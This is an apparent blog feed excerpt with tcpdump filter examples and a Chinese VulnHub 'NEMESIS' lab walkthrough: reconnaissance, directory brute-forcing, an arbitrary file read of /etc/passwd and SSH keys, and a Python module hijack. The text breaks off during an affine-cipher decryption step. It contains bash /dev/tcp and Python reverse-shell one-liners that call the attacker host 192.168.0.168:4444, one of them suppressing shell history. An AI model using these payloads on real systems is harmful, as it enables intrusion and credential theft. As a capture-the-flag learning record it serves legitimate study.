&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;按主机名过滤：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump host 110.42.178.227&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;按源地址过滤：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump src 110.42.178.227&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;按目标地址过滤&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump dst 110.42.178.227&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;捕获整个网段：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump net 192.168.0.0/24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;捕获一个端口：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump port 22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;捕获端口区间：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump portrange 21- 2121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;多个选项与：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump host 110.42.178.227 and port 21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;多个选项或：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump host 110.42.178.227 or port 2 121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;排除选项：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump host 110.42.178.227 and not 1.117.52.219&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/146%20NEMESIS/</guid>
            <title>VULNHUB 46 NEMESIS</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/146%20NEMESIS/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEtbmVtZXNpcy0xMDEsNTgyLw==&#34;&gt;https://www.vulnhub.com/entry/ia-nemesis-101,582/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS9uZW1lc2lzLXZ1bG5odWItd2Fsa3Rocm91Z2gv&#34;&gt;https://www.infosecarticles.com/nemesis-vulnhub-walkthrough/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 NEMESIS：桥接于 192.168.0.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1399.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;2 ）粗略的识别一下该 ip 上开放了哪些端口&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1400.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.0.184 靶机开放端口 80&lt;/p&gt;
&lt;p&gt;3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1402.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;检索到的有效服务如下所示：&lt;br&gt;
52846 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 80 52845 http：可对 web 进行渗透测试收集信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODQv&#34;&gt;http://192.168.0.184/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1403.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;到处看了看，发现有一个用户名和密码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Login Details =&amp;gt; username : hacker_in_the_town password : thanos&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1404.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到登陆界面，用这个账户密码尝试登陆&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1405.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;登陆成功，但是进入到登陆后的界面，查询之后没有任何发现&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1406.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用字典爆破目录，收集目录信息信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.0.184/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1407.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;依次访问几个目录发现没有比较明显的漏洞，换个字典，在爆破一波目录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.184/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1408.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;爆出来的目录里边都没有什么发现，看一下下一个端口网站&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODQ6NTI4NDUv&#34;&gt;http://192.168.0.184:52845/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1410.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.184:52845&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1411.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.184:52845/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1412.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目录都没有什么问题，看来只能对页面的功能点尝试了&lt;/p&gt;
&lt;h3 id=&#34;任意文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件读取&#34;&gt;#&lt;/a&gt; 任意文件读取&lt;/h3&gt;
&lt;p&gt;在如下界面中，找到一个发送信息的功能，输入了如下信息之后发现有回显&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1414.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点击发送消息后，读取到了 passwd 文件，审查源代码进行规范化，我们拿到了有 shell 的三个用户分别为 root，carlos，thanos&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1415.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然能读取文件，不妨测试一下是否能读到私钥文件，通过私钥文件登陆靶机&lt;/p&gt;
&lt;p&gt;依次读取这三个用户下的.ssh 文件夹下的 id_rsa 文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1416.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;root 下的没有读取到，可能是做了权限设置或者不存在私钥文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1417.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;thanos 下的读取到了，审查源代码处复制私钥到本地&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1418.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;最后把 carlos 下的私钥文件看看&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1419.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个用户下的私钥文件也没有读取到&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1420.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;特权用户计划任务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#特权用户计划任务&#34;&gt;#&lt;/a&gt; 特权用户计划任务&lt;/h3&gt;
&lt;p&gt;根据泄漏的私钥文件登陆到靶机中，注意修改私钥文件的权限&lt;br&gt;
 &lt;code&gt;chmod 600 thanos_id_rsa&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;ssh thanos@192.168.31.47 -p 52846 -i ~/Desktop/vulnhub/nemesis/thanos_id_rsa&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1421.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在靶机上看到了一个备份文件内容如下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1422.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;上传 pspy 监控，看这个备份脚本有没有定期被执行&lt;br&gt;
 &lt;code&gt;wget 192.168.0.168/pspy64s -q ;chmod +x pspy64s;./pspy64s&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1423.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到这个 UID=1000 的用户定期执行了 backup.py 这个脚本，而在前面收集到的 /etc/passwd 文件可知，UID=1000 的用户是 carlos&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1424.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;分析这个备份文件，可知它引入了 zipfile 这个包，而它会优先在同一目录下寻找 zipfile，当脚本将被执行时，它不会使用 zipfile 模块，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS16aXBmaWxlLTJkNWsyY3NyaDlzcXQ5YXpmbWg1YnI0Znp0dzZwOWR4MzlhdWQyZC5weQ==&#34;&gt;而是会导入我们的恶意软件 zipfile.py&lt;/span&gt;，并且我们的反向 shell 也会被执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可在本地尝试此命令是否能反弹shell：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; zipfile.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ZIP_DEFLATED = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class ZipFile:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def close(*args):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def write(*args):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def __init__(self, *args):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__import__(&amp;#x27;os&amp;#x27;).system(&amp;#x27;bash -c &amp;quot;bash -i&amp;gt;&amp;amp; /dev/tcp/192.168.0.168/4444 0&amp;gt;&amp;amp;1&amp;quot;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1425.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;py反弹shell优化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py反弹shell优化&#34;&gt;#&lt;/a&gt; py 反弹 shell 优化&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;也可以不用借助bash直接用python来反弹shell，本地测试能否用在上靶机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.0.168&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上面的这个脚本不会反弹处标准shell，下面的这个会反弹处标准终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.0.168&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&amp;quot;HISTFILE&amp;quot;,&amp;quot;/dev/null&amp;quot;);pty.spawn(&amp;quot;/bin/bash&amp;quot;);s.close()&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;仿射加密法解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#仿射加密法解密&#34;&gt;#&lt;/a&gt; 仿射加密法解密&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;现在成功拿到了 carlos 用户，即 UID= 1000 用户的终端，看到一个加密脚本仿射加密法与单码加密法没什么不同，因为明文的每个字母分别只映射到一个密文字母。仿射密码的加密算法就是一个线性变换，即对任意的明文字符 x，对应的密文字符为 y=e (x)=ax+b (mod26)，其中，a,b∈Z 26 ，且要求 gcd (a, 26 )= 1 , 函数 e (x) 称为仿射加密函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1426.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且在此目录下找到了一个文件提示说密码为&lt;/p&gt;
&lt;p&gt;The password format is “****&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;FUN&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;”&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;此脚本的作用就是将原密码加密后变成了 FAJSRWOXLAXDQZAWNDDVLSU 要两个 key 值，知道 FUN 经过加密后变成了 QZA，依此推断 key 的范围。关于更多放射密码可访问 https://en.wikipedia.org/wiki/Affine_cipher&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; 1.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def affine_encrypt(text, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return &amp;#x27;&amp;#x27;.join([ chr((( key[0]*(ord(t) - ord(&amp;#x27;A&amp;#x27;)) + key[1] ) % 26) + ord(&amp;#x27;A&amp;#x27;)) for t in text.upper().replace(&amp;#x27; &amp;#x27;, &amp;#x27;&amp;#x27;) ])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	affine_text=&amp;quot;FUN&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	for key0 in range(65, 91):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		for key1 in range(65, 91):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			encrypt_text = affine_encrypt(affine_text, [key0, key1])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			if encrypt_text == &amp;quot;QZA&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				print(key0,key1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				sys.exit(0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1427.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到 key 为（ 89 ， 65 ）之后，编写解密文件，进行解密密码&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; 2.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def affine_decrypt(cipher):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	text = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	for t in cipher:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		b = ord(t) - 